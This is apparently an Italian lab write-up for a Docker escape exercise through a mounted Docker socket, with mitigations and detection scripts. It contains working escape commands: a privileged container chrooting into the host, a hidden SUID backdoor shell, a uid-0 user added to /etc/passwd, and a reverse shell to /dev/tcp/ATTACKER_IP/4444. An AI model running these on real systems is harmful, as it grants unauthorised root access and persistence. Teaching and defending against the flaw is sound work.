# Docker Escape - Container 1: Docker Socket Mount

## 📋 Informazioni sul Container

**Container:** docker_escape1 (172.20.0.2)  
**Vulnerabilità:** Docker socket montato (`/var/run/docker.sock`)  
**Difficoltà:** ⭐ Facile  
**Rischio Reale:** ⚠️⚠️⚠️ CRITICO

---

## 🔍 Cos'è la Vulnerabilità?

Il container ha il **Docker socket** (`/var/run/docker.sock`) montato come volume con permessi di lettura/scrittura:

```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:rw
```

### Perché è Pericoloso?

Il Docker socket è l'**interfaccia di comunicazione con il daemon Docker** che gira sull'host. Chi ha accesso al socket può:
- Creare nuovi container
- Avviare/fermare container esistenti
- Montare qualsiasi directory dell'host
- Eseguire container in modalità privilegiata
- **Ottenere accesso root completo all'host**

**In pratica: accesso al Docker socket = accesso root all'host!** 🚨

---

## 🎯 L'Exploit: Passo dopo Passo

### Step 1: Accesso al Container

```bash
ssh student@172.20.0.2
# Password: password
```

### Step 2: Verifica della Vulnerabilità

```bash
# Controlla se il socket esiste
ls -la /var/run/docker.sock
```

**Output atteso:**
```
srw-rw---- 1 root 984 0 Nov 17 09:17 /var/run/docker.sock
```

Il file di tipo `s` (socket) conferma la presenza del Docker socket.

### Step 3: Installazione Docker CLI

Il container non ha il client Docker installato di default. Installiamolo:

```bash
sudo apk add --no-cache docker-cli
```

Alpine Linux usa `apk` come package manager (non `apt-get`).

### Step 4: Verifica Accesso al Daemon Docker

```bash
# Testa la comunicazione con il daemon Docker dell'host
sudo docker ps
```

Se vedi la lista dei container, hai **pieno controllo sul Docker dell'host**! 🎯

### Step 5: Escape - Creare Container Privilegiato

Ora creiamo un nuovo container che:
- Gira in modalità `--privileged` (accesso completo ai device)
- Condivide il namespace PID dell'host (`--pid=host`)
- Monta l'intero filesystem dell'host su `/host` (`-v /:/host`)
- Usa `chroot` per "entrare" nel filesystem dell'host

```bash
sudo docker run -it --rm --privileged --pid=host -v /:/host alpine chroot /host /bin/bash
```

**Spiegazione dei parametri:**
- `docker run` - crea ed esegue un nuovo container
- `-it` - modalità interattiva con terminale
- `--rm` - rimuove il container quando esce
- `--privileged` - disabilita tutte le restrizioni di sicurezza
- `--pid=host` - condivide lo spazio PID dell'host
- `-v /:/host` - monta la root dell'host su `/host` nel container
- `alpine` - usa immagine Alpine Linux (leggera)
- `chroot /host /bin/bash` - cambia root in `/host` e avvia bash

### Step 6: Verifica - Sei Root sull'Host!

```bash
# Controlla chi sei
whoami
# Output: root

# Vedi l'hostname dell'host (non del container)
hostname
# Output: raienraies (o il nome del tuo host)

# Vedi i processi dell'host
ps aux | head

# Accedi ai file dell'host
ls /home
cat /etc/hostname

# Puoi fare QUALSIASI COSA come root!
```

---

## 🛡️ Perché Funziona?

1. **Docker Socket = API Root**: Il socket Docker non ha autenticazione. Chiunque possa scrivere al socket può controllare Docker come root.

2. **Container Privilegiato**: Con `--privileged`, il nuovo container ha accesso completo a tutti i device dell'host e può disabilitare le protezioni namespace.

3. **Mount dell'Host**: Montando `/` dell'host, abbiamo accesso a tutto il filesystem reale.

4. **chroot**: Cambiando la root directory, "entriamo" effettivamente nel filesystem dell'host invece che in quello del container.

---

## 💡 Varianti dell'Exploit

### Variante 1: Creare SUID Shell per Persistenza

```bash
# Dal container con Docker socket
sudo docker run --rm -v /:/host alpine sh -c "cp /bin/sh /host/tmp/.backdoor && chmod 4755 /host/tmp/.backdoor"

# Poi dall'host (come utente normale):
/tmp/.backdoor -p  # Shell root persistente!
```

### Variante 2: Reverse Shell

```bash
# Nel container, crea uno script
cat > /tmp/reverse.sh << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

# Eseguilo sull'host
sudo docker run --rm -v /:/host -v /tmp/reverse.sh:/reverse.sh alpine sh -c "chroot /host /bin/sh /reverse.sh"
```

### Variante 3: Aggiungere User Root

```bash
# Crea un nuovo utente root sull'host
sudo docker run --rm -v /etc:/host_etc alpine sh -c "echo 'hacker:x:0:0::/root:/bin/bash' >> /host_etc/passwd && echo 'hacker:password' | chpasswd --root /host_etc"
```

---

## 🌍 Scenari Reali

### Dove Trovi Questa Vulnerabilità?

1. **CI/CD Pipelines**
   - Jenkins, GitLab CI, GitHub Actions
   - Container che devono buildare immagini Docker
   - Spesso montano il socket per eseguire `docker build`

2. **Container di Management**
   - Portainer, Watchtower, Traefik
   - Tools di orchestrazione e monitoring
   - Necessitano accesso al Docker daemon

3. **Ambienti di Sviluppo**
   - Docker-in-Docker (DinD) configurazioni
   - Container di sviluppo con accesso a Docker
   - VS Code Dev Containers con Docker

4. **Misconfigurazioni**
   - Amministratori che montano il socket "per comodità"
   - Tutorial online che mostrano esempi non sicuri
   - Copy-paste di docker-compose.yml senza capire i rischi

---

## 🔒 Difese e Mitigazioni

### ❌ MAI Fare Questo

```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # PERICOLOSO!
```

### ✅ Soluzioni Sicure

#### 1. **Evitare di Montare il Socket**
La soluzione migliore: non farlo!

#### 2. **Usare Docker Socket Proxy**
Proxy che espone solo API specifiche, non tutto:

```yaml
services:
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      CONTAINERS: 1  # Solo lettura container
      IMAGES: 0      # No accesso immagini
      VOLUMES: 0     # No accesso volumi
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro  # Read-only!
    
  app:
    environment:
      DOCKER_HOST: tcp://docker-proxy:2375  # Usa proxy invece del socket
```

#### 3. **Read-Only Socket** (Limitato)
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro  # Read-only
```
⚠️ Ancora pericoloso! Può comunque leggere segreti e informazioni sensibili.

#### 4. **Rootless Docker**
Esegui Docker daemon come utente non privilegiato:
```bash
# Installa rootless Docker
dockerd-rootless-setuptool.sh install
```

#### 5. **AppArmor/SELinux Profiles**
Usa profili di sicurezza per limitare l'accesso al socket.

#### 6. **Usare Kubernetes invece di Docker**
Kubernetes ha RBAC e controlli più granulari.

---

## 📊 Impatto della Vulnerabilità

| Aspetto | Livello |
|---------|---------|
| **Confidenzialità** | 🔴 CRITICO - Accesso a tutti i file dell'host |
| **Integrità** | 🔴 CRITICO - Modifica completa del sistema host |
| **Disponibilità** | 🔴 CRITICO - Può spegnere/distruggere l'host |
| **Privilegi Ottenuti** | ROOT completo sull'host |
| **Persistenza** | Facile - SUID shells, backdoor, cronjobs |
| **Lateral Movement** | Accesso a tutti gli altri container |

**CVSSv3 Score: 10.0 (CRITICAL)**

---

## 🧪 Test di Sicurezza

### Come Verificare se Sei Vulnerabile

```bash
# Controlla i tuoi container attivi
docker ps --format "table {{.Names}}\t{{.Mounts}}" | grep docker.sock

# Ispeziona un container specifico
docker inspect <container_name> | grep -A5 "Mounts"

# Cerca nei docker-compose files
grep -r "docker.sock" /path/to/docker-compose-files/
```

### Audit Automatico

```bash
# Script per cercare container vulnerabili
for container in $(docker ps -q); do
  if docker inspect $container | grep -q "docker.sock"; then
    echo "⚠️  VULNERABILE: $(docker inspect $container --format '{{.Name}}')"
  fi
done
```

---

## 📚 Riferimenti e Approfondimenti

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Understanding Docker Socket Permissions](https://blog.quarkslab.com/docker-security.html)
- [Real-world Docker Socket Exploits](https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure)

---

## ⚖️ Note Legali

⚠️ **IMPORTANTE**: Questo documento è esclusivamente per scopi educativi in ambienti di laboratorio controllati. 

- **Non utilizzare** queste tecniche su sistemi senza autorizzazione esplicita
- L'accesso non autorizzato a sistemi informatici è **illegale**
- Ottieni sempre permesso scritto prima di testare la sicurezza
- Usa solo in ambienti di test isolati

---

## 🎓 Conclusioni

Il Docker socket mount è una delle vulnerabilità più **critiche** e **comuni** in ambienti containerizzati. 

**Lezioni Chiave:**
1. ✅ Non montare MAI `/var/run/docker.sock` senza una ragione critica
2. ✅ Se necessario, usa un proxy con permessi limitati
3. ✅ Monitora i tuoi container per questo tipo di configurazione
4. ✅ Educa gli sviluppatori sui rischi
5. ✅ Implementa security scanning nei tuoi CI/CD pipeline

**Ricorda**: Accesso al Docker socket = Accesso root all'host!

---

*Documento creato per il Docker Escape Lab - Container 1*  
*Data: Novembre 2025*
